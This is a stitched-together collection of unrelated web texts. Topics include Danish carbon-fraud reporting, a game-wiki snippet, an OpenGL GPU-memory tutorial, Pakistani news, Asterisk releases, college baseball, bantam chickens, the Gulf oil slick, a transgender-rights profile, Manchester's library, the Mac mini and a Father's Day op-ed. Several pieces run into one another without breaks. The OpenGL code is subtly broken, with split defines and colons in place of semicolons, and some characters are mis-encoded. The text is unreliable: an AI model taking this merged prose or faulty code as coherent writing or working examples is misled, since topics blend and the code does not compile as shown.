The EU 's climate chief is facing pressure to explain her failure to crack down on a loophole that allowed alleged fraudsters – a large number of them based in Britain – to make millions of euros through Europe 's emissions trading scheme .
Confidential documents seen by the Guardian show that Connie Hedegaard , the European commissioner for climate action , had been informed about fraudsters targeting the Danish carbon registry to enable them to trade in credits last summer , as the UK and the Netherlands were clamping down on the fraud by scrapping VAT on carbon trading .
An MEP last week lodged an official question asking what happened to the Danish registry while Hedegaard was climate minister , and what is being done across Europe to combat carbon fraud .
Denmark is now at the centre of a Europol investigation into carbon fraud worth € 5 bn ( £ 4.3bn ) .
An estimated 116 arrests have been made so far , around 30 of them in the UK .
Previously , Hedegaard had denied knowing about the suspected fraud until a Danish newspaper reported it in December .
" I was never informed about this until last autumn when Ekstra Bladet looked into the fraud , " she told the Guardian .
But the confidential climate ministry report seen by the Guardian , entitled VAT Fraud in the European CO2 Quota Register Including the Danish , appears to have been signed with Hedegaard 's initials , indicating she was made aware of the problem in August last year .
" The tax department this spring became aware of fraud in the EU with VAT in connection with trade of CO2 quotas and credits .
In particular Denmark seems to be the target of VAT fraud , " it said .
An appendix attached to the report also dated in August from the Danish tax authorities said that suspicious trades had been identified , most of them linked to the UK .
" For now we have two cases with an estimated loss in total of 3.8 m Danish kroner [ £ 440,000 ] .
The trades are primarily performed by UK operators with Danish VAT numbers . "
" There is still no clear image of how the fraud is organised , but there has been the common feature that the companies involved in the first suspicious transactions were companies from other EU countries that merely held accounts in the Danish quota registry . "
Hedegaard , who is now in charge of the EU 's carbon market and battling for deeper cuts in Europe 's carbon emissions , admitted having seen the confidential document .
But she denied she should have acted last summer because " it was a VAT fraud issue " .
When invited to clarify her position after a speech she gave at the International Institute for Environment and Development last Tuesday ( 11 May ) she admitted seeing the confidential document , but she denied she should have acted last summer because " it was a VAT fraud issue " .
" The whole paper did not hint that there should be a special problem that as a minister I should look into because they did n't know that at the time .
It was just a normal criminal thing – somebody making fraud on VAT . "
In July last year , the Danish Energy Authority was told by the European Commission to tighten up its procedures for account holders , but only applied the requirements on new accounts .
The number of accounts on Europe 's largest registry has since plummeted from 1,200 to 140 and suspected fraudulent trades worth at least € 2.11 m were made by account holders on the carbon registry even as late as December .
In so - called missing trader fraud , bogus traders open an account in a national carbon registry , buy emissions allowances in one EU country VAT - free and sell them on with VAT added .
The trader pockets the VAT without paying it to the national exchequer and the trader goes " missing " .
The Danish carbon registry appears to have been targeted because account holders did not need to supply basic information such as VAT numbers .
The regulations were simplified in 2007 , the year that Hedegaard became Denmark 's climate minister , so that the only means of verification for accounts was an email address .
The controversy over the Danish registry comes as Hedegaard faces a battle over a push to increase the EU 's commitment to cut carbon emissions from 20 % to 30 % by 2020 , and criticism over draft rules for the quantity of emissions allowed in the crucial third phase of the EU ETS , which includes safeguards to protect the market against misuse by governments and criminal activities .
Danish MP Ida Auken , who has tabled questions on the Danish registry before parliament to the current climate minister Lykke Friis , said : " A third grade child could read this and say there is something wrong with the Danish registry .
If the minister had acted straight , she would have stated clearly that a big mistake was made in the Danish registry during her time as minister . "
Auken added that although Hedegaard may have genuinely been underinformed by government departments she could have taken decisive action .
" Whether her officials had made her aware of the mistakes or not plays a role regarding what she knew at which point , but not in that she as minister carries the responsibility . "
Jorgensen , a social democrat MEP , said he was confident that although this time " Hedegaard and her colleagues are taking it extremely seriously " , national carbon registries should be administered by tax authorities who are used to dealing with tricky technical revenue issues .
But he added : " My fear is that they [ environment directorate general ] have n't got the means to deal with it fully .
There needs to be a full presentation of solutions before I am satisfied .
" Even though she is not from my political family , I 'm not criticising her as a person but I want to put pressure on her to deliver on her administration of the EU ETS . "

Background Edit
Easily the most recognizable of the companies operating under the Poseidon name , Poseidon Oil did not limit itself only to the excavation and pumping of petroleum - it also operated a number of nuclear power plants , one of which was Atomic Powerplant № 5 in Gecko . [ 1 ] [ 2 ]
Major installations belonging to this corporation were the Poseidon Oil Rig , [ 1 ] [ 3 ] later used as the headquarters of the Enclave on the Pacific Ocean , and the Navarro Refinery [ 1 ] on the coast of California .
Together with the Enclave , Poseidon Oil helped finance Senator Todd Peterson 's secret bunker .

You ’re an OpenGL developer and you need a simple way to know graphics memory information such as the memory size or memory usage ?
If so , this is the right place !
Few years ago , this kind of information was n’t available to OpenGL developers but today , the two majors in OpenGL ( I mean NVIDIA and AMD / ATI ) have added some useful extensions to fetch graphics card memory size and other related data .
OpenGL Memory Size with NVIDIA
NVIDIA has recently published the specs of a new extension called GL_NVX_gpu_memory_info .
Thanks to GL_NVX_gpu_memory_info you can retrieve the size of the total available GPU memory and the size of the current available GPU memory .
Here is a code snippet that shows how to use it .
GL_NVX_gpu_memory_info returns sizes in KB .
#define GL_GPU_MEM_INFO_TOTAL_AVAILABLE_MEM_NVX
0x9048 #define GL_GPU_MEM_INFO_CURRENT_AVAILABLE_MEM_NVX
0x9049 GLint total_mem_kb = 0 : glGetIntegerv( GL_GPU_MEM_INFO_TOTAL_AVAILABLE_MEM_NVX , &total_mem_kb ) ; GLint cur_avail_mem_kb = 0 : glGetIntegerv(GL_GPU_MEM_INFO_CURRENT_AVAILABLE_MEM_NVX , &cur_avail_mem_kb ) ;
This extension is used in GPU Shark to get the memory usage for NVIDIA graphics cards as you can see in the following picture :
According to Geeks3D OpenGL extensions DB , GL_NVX_gpu_memory_info is available in NVIDIA display drivers since R196.xx ( see R196.21 ) .
OpenGL Memory Size with AMD / ATI
AMD has released two extensions to deal with the size of video memory :
WGL_AMD_gpu_association is an extension developed for parallel rendering : you can create a different OpenGL context on each available GPU .
This extension comes with hardware query functionalities .
With WGL_AMD_gpu_association you can get the amount of graphics memory available for the GPU .
Here is how to use it to get the size of GPU memory in MB :
UINT n = wglGetGPUIDsAMD ( 0 , 0 ) ; UINT * ids = new UINT [ n ] ; size_t total_mem_mb = 0 ; wglGetGPUIDsAMD(n , ids ) ; wglGetGPUInfoAMD( ids[0 ] , WGL_GPU_RAM_AMD , GL_UNSIGNED_INT , sizeof ( size_t ) , &total_mem_mb ) ;
I tested this extension in this pico tool called Radeon - Z 😉
GL_ATI_meminfo is used when you need more detailed information about the available memory for VBO ( vertex buffer object ) or for your textures .

On June 22 , the US struck at a house officials called a “ suspected militant hideout , ” burying a few locals inside .
When others rushed to the scene to rescue them , they launched another missile , killing 13 apparently innocent Pakistanis .
When they held a funeral procession on June 23 , the US hit that too , ostensibly on the belief that Baitullah Mehsud might be among the mourners .
He was n’t , but the attack killed at least 80 more people .

Demanding a permanent ban on Facebook , over two dozen Pakistani religious groups working under the umbrella of the JuD have decided to contact the UN for enacting a global law " against blasphemy of prophets and awarding death penalty to violators . "
The decision to contact the UN and envoys from Muslims and non-Muslim states was made at a meeting of clerics belonging to the JuD , Jamaat-e- Islami , Jamiat Ulema-e - Pakistan , Tanzeem - e - Islami , Markaz - e - Ahlesunnat , Muslim Conference , Jamat - e- Ahlehadis , Jamiat Ulema - e - Islam , Pakistan Ulema Council and International Katham - e - Nabuwat .
The meeting , held yesterday at the JuD 's headquarters Markaz Alqaadsia in Chawburji , was presided over by JuD chief Hafiz Mohd Saeed .
" The ambassadors of Muslim and non-Muslim states will be told that blasphemy against prophets not only hurts the feelings of one religion but also sows a seed of hatred against the people of other religions , " the meeting observed .
The UN and envoys will be asked to support the enactment of an international law against blasphemy and the move to award the death penalty to violators , the meeting decided .
" Leaders of the ruling as well as of the opposition parties will also be called for their support , " the meeting decided .
Speaking on the occasion , Saeed asked the Muslim world to unite , introduce its own currency and develop a joint defence system .
The Muslim world should also spend the income from oil and other resources on the defence of Muslims , he said .
" It is shameful that our rulers and opposition are not playing their due role to register the protest of the nation with the US and other countries over the posting of blasphemous cartoons on ( Facebook ) , " Saeed said and demanded a permanent ban on Facebook .
His comments follow Pakistan 's recent move to cut off access to social networking website Facebook till May 31 over a page featuring blasphemous cartoons of Prophet Mohammed .

The Ubuntu Linux distribution is n't the only open source project with a long - term - support release on the horizon .
The Asterisk open source VoIP PBX ( define ) project is moving ahead with its own long - term support ( LTS ) plans with its 1.8 release .
Asterisk 's LTS releases are maintained for at least four years , as opposed to regular releases , which are only supported for a minimum of one year .
The Asterisk 1.4 release , which came out in 2006 , is considered the current LTS version , with the more recent Asterisk 1.6 branch designated as the regular release .
The move to an LTS model is a new approach for the Asterisk project .
Just a year ago , Kevin Fleming , director of software technologies at Digium , said that Asterisk 1.6 would be the base for future Asterisk releases and that no 1.8 release would be coming .
Digium is the lead commercial sponsor behind the Asterisk project , and was founded by Asterisk creator Mark Spencer .
" We 've decided to move toward a process that allows us to produce long - term support releases on a fairly consistent basis , " Fleming told InternetNews.com .
" We 've been trying to deal with the dichotomy of wanting a release to be stable for as long as possible while still having new features in Asterisk . "
With the Asterisk 1.6 release , the project tried to start putting out releases with new features faster , Fleming noted .
But some users complained that there were too many releases and it was too confusing to figure out which branch to use .
The solution is the new method where Asterisk is broken out into feature and LTS releases .
" Someone that is more focused on running an Asterisk server that they wo n't have to mess with for four years except for bug fix updates can now do that , " Fleming said .
" Someone that wants all the new stuff as it comes in can now do that , too . "
The Asterisk 1.8 LTS release will likely be available in the third quarter of 2010 and will include a number of new features .
" There are a lot of new items planned for 1.8 , and some stuff is already done and in the development trunk waiting for the branch to be released , " Fleming said .
" A lot of the changes may seem like subtle changes but when an end user sees the difference they will be very happy . "
One of the new features is a reverse call display function that will indicate who a user is actually talking to .
" So if you call me , I see on my phone your CallerID , and that has always worked .
You will now see on your phone , not the extension you dialed , but the CallerID you would have seen if I had called you , " Fleming explained .
Fleming added that if the call is transferred , the call display information is also updated to show the caller the CallerID of the person the user has been connected with .

The Gamecocks ( 54 - 16 ) won six straight games after losing their CWS opener against Oklahoma .
They became the third first - time champion since 2006 after sweeping the best - of - three series .
Each team had plenty of scoring chances , but had difficulty converting in Rosenblatt 's finale before the event moves to a new downtown stadium next year .
A video tribute to the stadium , fireworks and a trumpeter playing a slow version of " Take Me Out to the Ballgame " finished Rosenblatt 's 61 - year run as the CWS home .
" To be the last team to win it here , that 's amazing , " said winning pitcher Matt Price .
It was the fifth championship decided in an extra-inning final , and first since Southern California topped Florida State -- also 2 - 1 -- in 15 innings in 1970 .
" You start in February with 300 teams and you get a chance to go to postseason , and maybe to a super regional , and then you have things go right for you and you go to Omaha , " Tanner said .
" And you get to play in the national championship series .
And you 're the last team standing .
Just a wonderful , wonderful time for our players and coaches . "
Merrifield was surprised UCLA closer Dan Klein did n't intentionally walk him and Jackie Bradley Jr. , the CWS Most Outstanding Player , to set up forces all around and a possible double play .
" When I saw the catcher squat down , I knew I had something to prove .
They wanted to get me out , " Merrifield said .
Scott Wingo drew a leadoff walk and took second when catcher Steve Rodriguez , perhaps distracted when Evan Marzilli squared to bunt , let an inside 1 - 0 pitch get past him .
Wingo moved to third when Marzilli got a bunt down , and scored when Merrifield drilled Klein 's 2 - 0 pitch past the pulled - in outfield of the Bruins ( 51 - 17 ) and into right field .
" I worked the count in my favor and got a fastball , even though it was kind of down , I got the barrel on it , " he said .
" And it finally went the other way and shot it into the gap .
And it fell for me .
And it was a great feeling . "
Price ( 5 - 1 ) allowed one hit over 2 2/3 innings for the Gamecocks , who also went to the CWS finals in 1975 , ' 77 and 2002 , but came up short .
" I could have gone another two innings if I had to , " Price said .
" The adrenaline kicked in . "
Klein ( 6 - 1 ) took the loss after working 3 1/3 innings for the Bruins ( 51 - 17 ) -- " the greatest club we played the entire year , " Tanner said .
UCLA bounced back from a 27 - 29 campaign a year ago to reach the College World Series finals .
" I 've told the players that they have now reached the pinnacle in college baseball , " UCLA coach John Savage said .
" Now every player in that locker room knows what it feels like , what all the hard work and all the sacrifice to get to where they are .
Now the bar 's been raised , and we look to be back as soon as possible . "
Price worked out of a bases - loaded jam in the ninth , then allowed only one baserunner the rest of the way .
" Clutch pitching , big - time pitching , " Savage said .
" Big pitches in big counts .
We had a rally going after two outs , and we just could not come up with a big hit .
And that was the story the last two nights . "
South Carolina had runners in scoring position in four of the first six innings , including loading the bases in the second , but could push nothing across until the eighth .
Pinch - hitter Brady Thomas reached on a sharply hit ball up the middle to start the inning , chasing reliever Erik Goeddel .
Klein came on , and pinch - runner Robert Beary moved to second on Kyle Enders ' grounder .
Klein tried to trick Beary with a fake pickoff to second , with second baseman Cody Regis acting as if he were giving chase to a bad throw into center field .
Beary was n't fooled , but South Carolina fans did n't appreciate the shenanigans and booed loudly .
They were cheering moments later when Haney hit a chopper to the right side .
The ball glanced off UCLA first baseman Dean Espy 's glove , and Regis tried to grab it with his bare hand .
But Regis could n't get it , and Beary rounded third for home as the ball trickled into right field .
The Bruins loaded the bases in the top of the ninth against Price , but he struck out Niko Gallego to get out of trouble .
UCLA had to reset its infield for the bottom of the ninth .
Espy punched a dugout wall with his right -- throwing -- hand after committing the error that led to the tying run , and that left him icing his hand .
Trevor Brown moved from third base to first , Regis went from second to third and Adrian Williams took over at second .
Like the Gamecocks , UCLA missed out on early scoring chances and 1 for 8 with runners in scoring position .
The Bruins broke through in the fifth when Brown hit a leadoff single , moved over on a sacrifice and scored on Gallego 's two - out single to left .
" To get so close and to fall short hurts , " said UCLA starter Rob Rasmussen , who allowed six hits in six scoreless inning .
" I think maybe later tonight or tomorrow , as it all kind of sinks in , and as we look back on it , we 're all going to be proud of what we did . "

Bantams are tiny chickens , not young ones , but full grown small sized birds .
On the whole the Bantam breeds can are usually one - third to one - fifth the size of regular chicken breeds .
These smaller sized birds were named for the sea port Indonesian city , Bantam .
Their petite size made them the choice for sea going vessels and as such all small chickens were eventually referred to as “ Bantams ” or “ Banty's ” .
Even now there are many advantages to keeping Bantam Chickens .
As pets Bantams offer more color selection and variety in feathering than do most of the larger breeds .
For people who want showy pets these birds work well and can easily fit in a smaller yard or coop .
The hens are often more broody than the larger breeds , bred more for meat production , and laying .
As such the Bantam hens are desired for the purposes of hatching other birds eggs .
They are very good mothers on the whole , being protective over chicks even if they are not their own , or their own species .
Bantam hens have been used to raise quail , pheasant , and goose chicks .
Bantam roosters , on the other hand , are often more defensive .
This is an advantage as they will be extra protective against intruders in the hen house .
Many people are enjoying keeping Bantams for the purpose of exhibition .
There smaller size makes transportation to and from shows much easier as many more animals can be taken .
Smaller birds , just as smaller animals , need less feed .
Children find them cute , a good way to have kids help out and get involved .
This is a Silkie Bantam Chicken .
Other advantages of keeping Bantams also apply to other chickens , they eat bugs , weeds , and lay eggs .
Bantam eggs being about one - third to one - half the size of a regular hens egg .
Some of the more popular True Bantam chicken breeds are :
Belgian Bearded d'Uccle
Booted Bantam
Belted Bantam
Japanese Bantam
Nankin
Pekin
Sebright
Silkie
There are many other Bantam varieties , such as the Araucana , and Ameraucana , which were bred from the full sized birds , however the true breeds , as listed above , have no full sized version .
This is a Sebright .
Care :
Chickens should be kept in a coop , or barn , at night .
This needs to have a roosting place for them to use at night , and ideally they should be free ranged in the day .
Unless brooding , up to four birds can share one nesting box .
The nesting box should be raised off the ground by about 1 foot .
It can be lined with straw .
Like all chickens , Bantams must be fed chicken feed .
Ideally they should have laying ration during their laying period ( the spring and summer ) .
They can be fed chicken scratch as a treat , offered to encourage them to return to the coop for the night .
Chicken feed can be bought in bags from livestock feed supply stores .
If allowed to “ free range ” or if they have access to an outdoor pen , they will also enjoy eating dandelions , some plants , and insects , such as flies , grasshoppers , and mosquitoes .
They will also look for slugs , as such it is important you do not put any poisons out for garden pests .
They must have oyster shell , small grit , and access to fresh water .
Bantams are more at risk from predators and cats , who normally will not bother the larger chickens , may bother the smaller Bantam breeds .
In winter the birds must have a heat source if temperatures go below freezing .
Like most chickens , Bantams do not like to be kept alone , and a rooster is not needed to get eggs , only to get fertile eggs .
Their lifespan can be more than 10 years but many people kill birds after their laying declines .

At the time of publication , it represented the best available science .
During the first weeks following the explosion at the Deepwater Horizon well in the Gulf of Mexico , oil drifting from the site of the incident usually headed west and northwest to the Mississippi River Delta .
But in the third week of May , currents drew some of the oil southeast .
According to the National Oceanic and Atmospheric Administration ( NOAA ) , the southward spread increased the chance that the oil would become mixed up with the Loop Current , which might carry the oil toward Florida and the Keys .
This pair of sea surface temperature images shows how the warm waters of the Loop Current connect the Gulf of Mexico to the Atlantic Ocean ( top image , May 1 –8 , 2010 ) and the dynamic northern margin of the Loop Current a week and a half later , on May 18 ( bottom image ) .
Based on observations of infrared energy collected by the Moderate Resolution Imaging Spectroradiometer ( MODIS ) on NASA ’s Terra satellite , the images show cooler temperatures in blue and purple and warmer temperatures in pink and yellow .
Cloudy areas are light gray .
The Loop Current pushes up into the Gulf from the Caribbean Sea .
The current ’s tropical warmth makes it stand out from the surrounding cooler waters of the Gulf of Mexico in this image .
The current loses its northward momentum about mid-way through the gulf , and bends back on itself to flow south .
It joins warm waters flowing eastward between Florida and Cuba , which then merge with the Gulf Stream Current on its journey up the East Coast .
At a May 18 press conference , NOAA reported that “ satellite imagery on May 17 indicates that the main bulk of the oil is dozens of miles away from the Loop Current , but that a tendril of light oil has been transported down close to the Loop Current .
NOAA is conducting aerial observations today to determine with certainty whether oil has actually entered the Loop Currentâ€¦ .
The proximity of the southeast tendril of oil to the Loop Current indicates that oil is increasingly likely to become entrained . ”
The bottom image shows the location of the leaking well and the approximate location of the southern arm of the oil slick on May 17 ( based on natural - color MODIS imagery ) .
Oil was very close to the Loop Current , whose warm waters appear in yellow near the bottom of the image .
However , there is also an eddy of cooler water ( purple ) circulating counterclockwise at the top of the Loop Current .
According to NOAA , “ Some amount of any oil drawn into the Loop Current would likely remain in the eddy , heading to the northeast , and some would enter the main Loop Current , where it might eventually head to the Florida Strait . ”
Updated , May 20 : In a web posting , NOAA ’s Office of Response and Restoration confirmed that " a small portion of the oil slick has reached the Loop Current in the form of light to very light sheens . ”

Eating about two and a half airplane snacks ’ worth of nuts every day helps lower total cholesterol and “ bad ” LDL cholesterol , and improves the ratio of total cholesterol to “ good ” HDL cholesterol , a study reports .
Researchers pooled the results of 25 clinical trials that involved 583 participants over all .
The study reported that eating just 2.4 ounces of nuts of any kind was associated with declines of 10.2 milligrams per deciliter in bad cholesterol , a drop of about 7.4 percent , and 10.9 milligrams in total cholesterol , or 5.1 percent .
The study , which appeared in the May 10 issue of Archives of Internal Medicine , was partly financed by a nut - industry foundation , and two of the authors receive research money from other organizations representing the nut and peanut industries .
But the authors noted that some of the trials they analyzed had no corporate financing , yet came to similar conclusions .
Mara Keisling — 6 - foot - 2 , with frizzy brown hair and a wry smile — is the best - known transgender activist in Washington , which is to say she is not well known at all .
“ Trust me , ” Keisling said after finishing a conversation with one congressional staffer .
“ We have no political clout . ”
But as she wound her way through the Rayburn House Office Building , there were sparks of recognition .
“ Hey , Mara , ” another staffer said warmly when he bumped into her on his way to lunch .
Such small acknowledgments count as progress in Keisling ’s rarefied and often difficult campaign for transgender rights .
Ten years ago , when she was a transgender activist in her home state of Pennsylvania , Keisling was thrown out of lawmakers ’ offices and told she was going to hell .

Things have changed , although slowly .
And the movement that long lingered on the fringes of political debate — so much that even some mainstream gay and lesbian groups kept it at arm ’s length — has won several victories .
Last year brought the first federal law with protections for transgender people — the landmark Matthew Shepard and James Byrd Jr. Hate Crimes Prevention Act — along with scores of state and local ordinances banning discrimination based on gender identity .
In February , the U.S. Tax Court ruled that hormone treatments and sex reassignment surgeries are tax - deductible , an important issue for transgender people .
Activists say they have found an ally in President Obama , who has appointed three openly transgender people to his administration — Amanda Simpson at the Commerce Department , Dylan Orr at the Labor Department and Ejay Jack to the Presidential Advisory Council on HIV / AIDS .
The biggest battle activists now face in Washington is for inclusion in the Employment Non-Discrimination Act , or ENDA , a bill first introduced in 1994 to protect gay and lesbian people from prejudice on the job .
Advertisement
In 2007 the bill was broadened to include protections for workers treated unfairly because of their “ gender identity . ”
That phrase would have protected transgender people , including transsexuals , cross-dressers and others who express themselves in a gender other than the one they were assigned at birth .
But not everyone was ready for it .
Rep. Barney Frank ( D - Mass. ) , an openly gay lawmaker and a lead sponsor of ENDA , stripped out the protection for gender identity after fellow lawmakers told him they could n’t vote for the bill if it was included .
“ This transgender thing , this is new , ” Frank said lawmakers told him .
“ This scares people . ”

A schism opened in the world of gay , lesbian and transgender rights .
Transgender activists picketed outside of a dinner organized by the Human Rights Campaign , the nation ’s largest lesbian , gay , bisexual and transgender advocacy group , which supported the new bill .
The organization ’s only transgender board member resigned .
In a speech , Keisling accused the group of “ actively hurting trans people . ”
Keisling , who a few years before had moved to Washington to form an organization to advocate exclusively for transgender - friendly laws and policies at the federal level , was well poised to help lead the newly galvanized transgender movement .
Her primary task : education .
Unlike gays and lesbians , who have been elected to office , played in national sports leagues and hosted talk shows , there are few openly transgender figures in popular culture .
Advertisement
So Keisling gave hundreds of interviews and has spent many hours on Capitol Hill talking about an issue that many still find uncomfortable and ambiguous , both in political terms and otherwise .
Before one interview with Fox News , an anchor asked her repeatedly whether she had had sex- reassignment surgery .
“ I ’m here to talk about policy , Keisling said she responded curtly .
“ My medical records are my business . ”
Keisling grew up as a boy named Mark in Harrisburg , Pa. , one of seven brothers and sisters .
The family was political — Keisling ’s father once served as the governor ’s chief of staff — and Keisling studied government at Harvard University and worked for a time as a political pollster on Democratic campaigns .
Advertisement
In the late 1990s , Keisling told his friends and family he had always felt like a woman , and began the process of transition .
Mark became Mara .
She turned to activism in 1999 out of frustration with discriminatory policies that kept transgender people she knew from getting jobs , raising children and otherwise living normal lives .
“ There were so many people getting a really raw deal , ” she said .
Today , the six staff members of Keisling ’s National Center for Transgender Equality work out of a cramped but cheerful office rented from the National Air Traffic Controllers Assn .
The center does research — a recent survey it conducted with the National Gay and Lesbian Task Force found that transgender people are twice as likely to live in poverty as other Americans , and nearly all have experienced harassment or discrimination on the job .
And it has compiled a wide - ranging list of recommended policy changes , including amending Medicare and Medicaid policies to include hormone therapy , and changing the way prisons segregate inmates ( the organization would like to see prisoners separated by gender identity , not birth sex ) .
Advertisement
The organization has also brought more than 1,000 transgender people from around the country to Washington to talk to their representatives about the nondiscrimination bill — an effort that has paid off .
Last year , new versions of ENDA were introduced in both chambers of Congress — this time with full protections for transgender people .
A coalition of hundreds of gay and lesbian and transgender groups , United ENDA , has pledged to support only transgender - inclusive legislation .
Last week , 13 gay and transgender protesters were arrested after they staged a demonstration at Sen.
Richard J. Durbin ’s office and demanded that the Senate ’s second - highest - ranking Democrat sign a fully inclusive bill .
The House bill , which has more than 200 co-sponsors , is expected to go before the House Committee on Education and Labor soon .
President Obama has indicated that he will sign the bill if it passes Congress .
Despite the victories , the battle for acceptance is constant .
Keisling and her colleagues have learned to tread carefully .
During one meeting , they debated who they should invite to speak to transgender activists at their lobby day .

Suggestions of Lady Gaga and Cyndi Lauper were quickly shot down .
“ We do n’t want partiers , ” said communications director Justin Tanis .
Less flashy candidates , like Vice President Joe Biden , were also rejected .
“ No Secret Service , ” said Stephanie White , the managing director .
Barney Frank was nixed , for obvious reasons .
“ We do n’t want Barney yelling at our people , and we do n’t want our people yelling at Barney , ” Keisling said .
When House Speaker Nancy Pelosi ’s name came up , heads nodded .
White said she would put in a request to the San Francisco Democrat , and called the meeting to an end .

A few weeks later , they learned Pelosi had declined the invitation .

ONE million books from Manchester 's Central Library – including valuable volumes dating back to the 15th century - are to be put into temporarily storage with many going deep underground in the Cheshire salt mines .
Works from the city 's reference library will be stored in the mines , hundreds of feet below ground , for the next three years while the landmark city centre site undergoes a massive refurbishment to save it from ruin .
Experts say the mine 's caverns – the size of 700 football pitches - provide the perfect environment for preserving the manuscripts , which include the works of eminent academics .
A phased shut down of the St Peter 's Square library will begin next month , with the site closing its doors in June .
The Library Theatre , which will most likely relocate to the historic Theatre Royal , will close the following month with a celebratory show entitled Last Night at the Library .
A temporary city library will open in Elliot House , on Deansgate , where staff will also be able to arrange access to some rare reference works that are not available elsewhere in the country .
All others will be stored in the salt mines from where they will be digitally catalogued but inaccessible for the duration of the refurbishment .
More than 22 miles of shelving and one million books - including more than 30 works dating back to the 15th century and 44,000 published before 1850 - will be relocated to the mines , Elliot House and other temporary locations including the Royal Northern College of Music .
The project is part of multi-million pound plans to transform and modernise St Peter 's Square and the Town Hall Complex , bringing services and facilities up to date and carrying out vital restoration works to the listed buildings .
Central Library will re-open in 2013 with a new state - of - the - art lending library , electronic catalogue and archive centre , to bring historic local collections under one roof .
A one - stop customer services centre will also be created on the ground floor of the town hall extension .
From April , some 1,800 council staff will be moved to First Street , at the city centre 's southern gateway , for four years while restoration work takes place .
A temporary customer services point will open to the public there in early summer .
The Library Theatre Company will temporarily be based at Zion Arts , on Stretford Road , and stage regular performances at The Lowry .
Coun Mike Amesbury , Manchester 's spokesman for culture and leisure , said : " We recognise that Manchester ’s Central Library is one of the finest buildings in the city and one of the finest libraries in the country .
This refurbishment and restoration is absolutely necessary to ensure that the Library can continue to be a jewel in Manchester ’s crown . "
Head of library services , Neil MacInnes , added : " When Central Library reopens , it will be a real world class facility that Manchester can rightly be proud of , completely in keeping with its history and heritage . "
Members of Central Library can also use all other libraries in Manchester .
Timetable for Central Library closure :
Inside the World 's Worst Hellhole Somalia , the Perfect Failed State
Somalia , which has been without a functioning government for almost two decades , serves as a warning for what could happen to other failed states .
Rival Islamic militias battle for control of the capital , where the president , Sheikh Sharif Sheikh Ahmed , is in constant danger of his life .
A visit to the worst place on the planet .
In addition to iPhone 4 preorders starting Tuesday morning , Apple also rolled out a relatively major update to the Mac mini .
The little headless Mac now comes in a unibody aluminum enclosure like its notebook brethren , and sports a new HDMI port , SD card slot , and improved graphics performance .
With the new casing , the mini is 7.7 inch square and only 1.4 inches thick , including an integrated power supply .
This is down from 6.5 inches square and two inches high in the previous model — it appears Apple is trying to get the mini to look a lot like the Apple TV , which is also a 7.7 inch square with an HDMI port .
Both flavors of Mac mini now come with the NVIDIA GeForce 320 M , which is the same integrated GPU that comes in the current MacBook ( the last mini came with a NVIDIA GeForce 9400 M ) .
This , according to Apple , will bring " twice the graphics performance " of the previous Mac mini model .
The machines come in either 2.4 or 2.66GHz flavors with 2 and 4GB of RAM as a base respectively , though they can go up to 8 GB of RAM with build - to - order options .
Like before , the high - end mini is actually a compact Snow Leopard server , with two 500GB hard drives and no optical drive .
That model goes for $ 999 , while the entry - level model starts at $ 699 — a surprising price increase given the relatively minor changes in internal hardware .
Additionally , Apple has finally given users an easy way to upgrade the Mac mini's RAM themselves with a circular panel on the bottom for easy access .
The M - 80 Stiletto is a prototype naval ship , manufactured by the M - Ship Company , that may go into service with the United States Navy SEALs within a short time frame .
It has a top speed of over 50 knots and a range of 750 nautical miles , and is powered by four 1,650 hp engines manufactured by the Caterpillar Company .
Weighing only 45 tons unloaded , the vessel is light enough that it can be hoisted onto a cargo ship , while still able to carry up to 20 tons of cargo in the 2,000 square feet of usable interior space .
The ship is 88.6 feet in length , with a width of 40 feet and a height of 18.5 feet , yet has a draft of only 2.5 feet .
Even though it has a quite shallow draft , the ship is exceptionally stable on rough seas , due to its wide body .
This allows the Stiletto to operate both out at sea , and in shallow water .
Its unique Double - M hull channels air underneath the hull , lifting it out of the water , thereby reducing friction and increasing speed while maintaining a shallow draft .
Additionally , the ship 's hull is faceted in order to deflect radar .
One key feature of this boat is that it can set up a network between the boat and a special forces team by launching an unmanned aerial vehicle ( UAV ) that would relay information between the team and boat .
The Stiletto will also carry surveillance UAVs to provide reconnaissance for the SEAL team , and using a clustered supercomputer on board , will be able to send a real - time image to the team on shore .
The boat is made almost entirely of carbon - fiber , with a base cost of $ 6,000,000 for a boat , while a fully - equpped boat will be $ 10,000,000 .
As a father , I 've come to dread the appearance of Father 's Day .
Not because of lame presents or family members forgetting the day altogether .
My son usually tries to get up early enough to make me breakfast in bed , though as he gets deeper into his teens the idea of early gets later and " breakfast in bed " means that I 'm breakfasting while he 's in bed .
But he always rises to the occasion and provides a heartfelt , homemade card by the end of the day and a poetry anthology or a CD of what he thinks my favorite music is .
What really troubles me about Father 's Day is the bad rap fathers get .
Three years ago , Time magazine marked the approach of Father 's Day with an article wondering " whether dads have done a good enough job to deserve the honor . "
Two years ago , presidential candidate Barack Obama used a Father 's Day sermon to proclaim , " Too many fathers are MIA , too many fathers are AWOL . "
Last year , National Geographic
News focused on a tribe in the Himalayas for its Father 's Day coverage .
The title : " No - Fathers Day : Remote Group Has No Dads , and Never Did . "
The concluding thought : " Are fathers really necessary ? "
As another Father 's Day approaches - the 100th anniversary of the first Father 's Day , by the way - I ask America to celebrate , not castigate , its fathers .
After all , studies and census abstracts show that more American dads are spending more time doing more things with their kids than at any time in our post - agrarian society .
Almost 2 1/2 million single parents today are single fathers - an increase of more than 30 percent over the past 15 years .
The number of stay - at - home dads rose nearly 60 percent between 2003 and 2008 and is expected to keep rising as the economy and family roles continue to change .
Newsweek 's Julia Baird reported in a recent column that " Millennial fathers - those under 29 - spend an average of 4.3 hours per workday with their kids , which is almost double that of their counterparts in 1977 . "
Finally , a Lever study that found that four of out five dads who responded " show more physical affection to their children than their parents did with them . "
A startling statistic from that study was that these fathers " hug and kiss their children an average of five times a day . "
Startling to me , as my father never hugged me once in his lifetime .
Not once .
Clearly this is not our father 's Father 's Day .
Millions of fathers still have to step up to the plate , however .
Nearly 25 million children are growing up in America without fathers - making our country the world 's leader in fatherless families .
A distressing 28 percent of white kids , 39 percent of Latino kids and almost 70 percent of black kids will wake up on Father 's Day without a their biological fathers at home .
The impact of this is devastating .
Children without fathers are more prone to nearly every negative development imaginable : more drug use , more depression , more crime , higher rates of teen pregnancy , dropping out of school , gang activity - and a lifetime of poverty .
Kids need their fathers .
Most wo n't say it in words , but they 're certainly acting it out .
Father advocate groups around the country are showing men how to do better .
They are pushing to reform divorce laws and welfare regulations that end up separating dads from their children .
President Obama has gotten involved in a positive way , providing generous funding for several fatherhood - strengthening initiatives .
And a new trend is becoming clear :
More dads are doing more for their kids since the days when families lived together on farms .
They 're demonstrating awareness that the word father is n't just a noun - it 's a verb .
